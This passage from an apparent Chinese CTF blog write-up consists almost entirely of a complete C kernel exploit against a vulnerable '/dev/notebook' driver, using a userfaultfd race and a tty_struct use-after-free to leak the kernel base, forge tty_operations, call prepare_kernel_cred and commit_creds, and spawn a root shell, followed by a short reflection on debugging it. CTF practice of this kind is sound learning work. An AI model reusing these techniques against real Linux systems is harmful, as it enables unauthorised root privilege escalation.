class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/tty.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> tty_struct_size 0x2e0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ptm_unix98_ops_offset 0xe8e440</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pty_unix98_ops_offset 0xe8e320</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> push_rdi_pop_rsp_pop_rbp_add_rax_rdx_ret 0xffffffff81238d50</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> push_rdx_add_byte_r11_0x41_r11b_pop_rsp_pop_rbp_ret 0xffffffff8170dd41</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> commit_creds 0xffffffff810a9b40</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> init_cred 0xffffffff8225c940</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> swapgs_restore_regs_and_return_to_usermode 0xffffffff81a00929</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop_rdi_ret 0xffffffff81007115</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop_rdx_pop_rbp_ret   0xffffffff8103658c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> push_rdi_pop_rsp_pop_rbp_or_eax_edx_ret   0xffffffff8143f4e1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop_rsp_ret 0xffffffff810bc110</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ret 0xffffffff81000091</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prepare_kernel_cred 0xffffffff810a9ef0 </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mov_rdi_rax_call_rdx  0xffffffff8270747f</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop_rdx_ret 0xffffffff81358842</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MOV_RDI_RAX_POP_RBP_RET 0xffffffff81045833</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> work_for_cpu_fn 0xffffffff8109eb90</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> vmlinux_nokaslr_addr=<span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> kernel_base=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">saveStatus</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usr_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;getshelling&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(getuid()==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]----getshell ok&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] getshell fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *page;</span><br><span class="line"><span class="keyword">size_t</span> page_size;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">pthread_t</span> monitor_thread;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> *msg)</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">registerUserFaultFd</span><span class="params">(<span class="keyword">void</span> * addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> len, <span class="keyword">void</span> (*handler)(<span class="keyword">void</span>*))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line">    <span class="keyword">int</span> s;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create and enable userfaultfd object */</span></span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;userfaultfd&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_register.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) addr;</span><br><span class="line">    uffdio_register.range.len = len;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line"></span><br><span class="line">    s = pthread_create(&amp;monitor_thread, <span class="literal">NULL</span>, handler, (<span class="keyword">void</span> *) uffd);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *page;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *</span></span><br><span class="line"><span class="function"><span class="title">fault_handler_thread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="keyword">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="keyword">long</span>) arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="keyword">int</span> nready;</span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line">        sleep(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            errExit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        uffdio_copy.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp;</span><br><span class="line">                                              ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> idx;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">    <span class="keyword">char</span> * buf;</span><br><span class="line">&#125;Userarg;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> note_fd;</span><br><span class="line"><span class="keyword">char</span> *userfaultfd_buf;</span><br><span class="line"><span class="keyword">size_t</span> page_size;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> note_fd,<span class="keyword">size_t</span> idx,<span class="keyword">size_t</span> size,<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">    Userarg userarg=&#123;</span><br><span class="line">        .idx=idx,</span><br><span class="line">        .buf=buf,</span><br><span class="line">        .size=size</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(note_fd,<span class="number">0x100</span>,&amp;userarg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit</span><span class="params">(<span class="keyword">int</span> note_fd,<span class="keyword">size_t</span> idx,<span class="keyword">size_t</span> size,<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">    Userarg userarg=&#123;</span><br><span class="line">        .idx=idx,</span><br><span class="line">        .buf=buf,</span><br><span class="line">        .size=size</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(note_fd,<span class="number">0x300</span>,&amp;userarg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gift</span><span class="params">(<span class="keyword">int</span> note_fd,<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">    Userarg useraeg=&#123;</span><br><span class="line">        .buf=buf</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(note_fd,<span class="number">0x64</span>,&amp;useraeg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit_userfaultfd</span><span class="params">(<span class="keyword">int</span> idx)</span></span>&#123;</span><br><span class="line">    edit(note_fd,idx,<span class="number">0x2000</span>,userfaultfd_buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_userfaultfd</span><span class="params">(<span class="keyword">int</span> idx)</span></span>&#123;</span><br><span class="line">    add(note_fd,idx,<span class="number">0x50</span>,userfaultfd_buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">serial_icounter_struct</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">            <span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">    <span class="keyword">int</span>  (*install)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*remove)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*open)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*close)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*shutdown)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*cleanup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*write)(struct tty_struct * tty,</span><br><span class="line">              <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">int</span> count);</span><br><span class="line">    <span class="keyword">int</span>  (*put_char)(struct tty_struct *tty, <span class="keyword">unsigned</span> <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">void</span> (*flush_chars)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*write_room)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*chars_in_buffer)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*ioctl)(struct tty_struct *tty,</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">long</span> (*compat_ioctl)(struct tty_struct *tty,</span><br><span class="line">                 <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">void</span> (*set_termios)(struct tty_struct *tty, struct ktermios * old);</span><br><span class="line">    <span class="keyword">void</span> (*throttle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*unthrottle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*stop)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*start)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*hangup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*break_ctl)(struct tty_struct *tty, <span class="keyword">int</span> state);</span><br><span class="line">    <span class="keyword">void</span> (*flush_buffer)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*set_ldisc)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*wait_until_sent)(struct tty_struct *tty, <span class="keyword">int</span> timeout);</span><br><span class="line">    <span class="keyword">void</span> (*send_xchar)(struct tty_struct *tty, <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmget)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmset)(struct tty_struct *tty,</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">set</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span> clear);</span><br><span class="line">    <span class="keyword">int</span> (*resize)(struct tty_struct *tty, struct winsize *ws);</span><br><span class="line">    <span class="keyword">int</span> (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);</span><br><span class="line">    <span class="keyword">int</span> (*get_icount)(struct tty_struct *tty,</span><br><span class="line">                struct serial_icounter_struct *icount);</span><br><span class="line">    <span class="keyword">void</span> (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">    <span class="keyword">int</span> (*poll_init)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> *options);</span><br><span class="line">    <span class="keyword">int</span> (*poll_get_char)(struct tty_driver *driver, <span class="keyword">int</span> line);</span><br><span class="line">    <span class="keyword">void</span> (*poll_put_char)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">proc_fops</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">size_t</span> idx;</span><br><span class="line">&#125;Notebook;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    saveStatus();</span><br><span class="line">    <span class="keyword">size_t</span> tty_struct[<span class="number">0x200</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> tty_fd[<span class="number">0x100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">pthread_t</span> tid;</span><br><span class="line">    note_fd=open(<span class="string">&quot;/dev/notebook&quot;</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">0x200</span>];</span><br><span class="line">    Notebook notebook[<span class="number">0x10</span>];</span><br><span class="line">    page_size=sysconf(_SC_PAGE_SIZE);</span><br><span class="line">    userfaultfd_buf=mmap(<span class="literal">NULL</span>,page_size,PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    page=<span class="built_in">malloc</span>(page_size);</span><br><span class="line">    <span class="built_in">memset</span>(page,<span class="number">1</span>,page_size);</span><br><span class="line">    registerUserFaultFd(userfaultfd_buf,page_size,fault_handler_thread);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x10</span>;i++)&#123;</span><br><span class="line">        edit(note_fd,i,<span class="number">0x2e0</span>,name);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x10</span>;i++)&#123;</span><br><span class="line">        pthread_create(&amp;tid,<span class="literal">NULL</span>,edit_userfaultfd,i);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x100</span>;i++)&#123;</span><br><span class="line">        tty_fd[i]=open(<span class="string">&quot;/dev/ptmx&quot;</span>,O_RDWR | O_NOCTTY);</span><br><span class="line">        <span class="keyword">if</span>(!tty_fd[i])&#123;</span><br><span class="line">            errExit(<span class="string">&quot;ptmx open fail&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x10</span>;i++)&#123;</span><br><span class="line">        pthread_create(&amp;tid,<span class="literal">NULL</span>,add_userfaultfd,i);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fake_tty_ops_idx=<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x10</span>;i++)&#123;</span><br><span class="line">        read(note_fd,tty_struct,i);</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> magic=*(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)tty_struct;</span><br><span class="line">        <span class="keyword">if</span>(magic!=<span class="number">0x5401</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(fake_tty_ops_idx==<span class="number">-1</span>)&#123;</span><br><span class="line">                fake_tty_ops_idx=i;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[*] fake_tty_ops_idx %d\n&quot;</span>,fake_tty_ops_idx=i);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(fake_tty_ops_idx==<span class="number">-1</span>)&#123;</span><br><span class="line">        errExit(<span class="string">&quot;fake_tty_ops_idx  find fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> uaf_tty=<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x10</span>;i++)&#123;</span><br><span class="line">        read(note_fd,tty_struct,i);</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> magic=*(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)tty_struct;</span><br><span class="line">        <span class="keyword">if</span>(magic==<span class="number">0x5401</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*] uaf_idx %d\n&quot;</span>,uaf_tty=i);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(uaf_tty==<span class="number">-1</span>)&#123;</span><br><span class="line">        errExit(<span class="string">&quot;not uaf_tty&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">size_t</span> tty_ops=tty_struct[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">if</span>((tty_ops&amp;<span class="number">0xfff</span>)==<span class="number">0x440</span>)&#123;</span><br><span class="line">        kernel_base=tty_ops-ptm_unix98_ops_offset;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        kernel_base=tty_ops-pty_unix98_ops_offset;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] kernel_addr %p\033[0m\n&quot;</span>,kernel_base);</span><br><span class="line"></span><br><span class="line">    edit(note_fd,fake_tty_ops_idx,<span class="number">0x200</span>,name);</span><br><span class="line">    gift(note_fd,notebook);</span><br><span class="line">    <span class="keyword">size_t</span> init_cred_addr=init_cred-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    <span class="keyword">size_t</span> commit_creds_addr=commit_creds-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    <span class="keyword">size_t</span> swapgs_restore_regs_and_return_to_usermode_addr=swapgs_restore_regs_and_return_to_usermode-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    <span class="keyword">size_t</span> pop_rdi_ret_addr=pop_rdi_ret-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    <span class="keyword">size_t</span> pop_rdx_pop_rbp_ret_addr=pop_rdx_pop_rbp_ret-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    <span class="keyword">size_t</span> fake_tty_ops[<span class="number">64</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">size_t</span> fake_tty_ops_addr=notebook[fake_tty_ops_idx].buf;</span><br><span class="line">    <span class="keyword">size_t</span> fake_tty_struct[<span class="number">10</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">memcpy</span>(fake_tty_struct,tty_struct,<span class="number">0x50</span>);</span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">64</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    fake_tty_struct[<span class="number">3</span>]=fake_tty_ops_addr;</span><br><span class="line">    fake_tty_struct[<span class="number">4</span>]=prepare_kernel_cred-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    fake_tty_struct[<span class="number">5</span>]=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    ((struct tty_operations *)fake_tty_ops)-&gt;ioctl=work_for_cpu_fn-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line"></span><br><span class="line">    write(note_fd,fake_tty_ops,fake_tty_ops_idx);</span><br><span class="line">    write(note_fd,fake_tty_struct,uaf_tty);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x100</span>;i++)&#123;</span><br><span class="line">        ioctl(tty_fd[i],<span class="number">0x200</span>,<span class="number">0x200</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    read(note_fd,fake_tty_struct,uaf_tty);</span><br><span class="line">    <span class="keyword">size_t</span> cred=fake_tty_struct[<span class="number">6</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] root_cred: %p\n&quot;</span>,cred);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] prepare_kernel_cred: %p\n&quot;</span>,fake_tty_struct[<span class="number">4</span>]);</span><br><span class="line">    fake_tty_struct[<span class="number">5</span>]=cred;</span><br><span class="line">    fake_tty_struct[<span class="number">4</span>]=commit_creds-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    write(note_fd,fake_tty_struct,uaf_tty);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x100</span>;i++)&#123;</span><br><span class="line">        ioctl(tty_fd[i],<span class="number">0x200</span>,<span class="number">0x200</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>解法二看别人博客是稳定性更好，但是我跑好几次才能成功一次，远没有解法一来的稳定，想深究就得嗯调（不知道代码在哪），哎。</p>
<p>这道题debug了快两天，其中比较坑的是就是关于<code>tty_struct</code>和<code>tty_operations</code>的伪造了，<code>tty_struct</code>如果伪造的有问题的话就会直接引起kernel painc,所以得<code>memcpy(fake_tty_struct,tty_struct,0x50)</code>然后再伪造成功率高一些（关键是找不到这块的源码在哪，不能看代码分析，只能嗯调，还是太菜了）。然后是关于<code>tty_operation</code>的伪造，本来的想法是直接在<code>tty_operation</code>上构造好完整的rop执行得了，但是一旦在<code>write</code>指针后面写东西的话就会崩掉。最后也只能跳到一个堆上再执行rop了。关键还是自己对内核不熟悉，就算想看代码都不知道在哪，非常折磨人，学完内核利用的基础知识点之后得赶紧把内核学习和内核代码阅读提上日程了。</p>
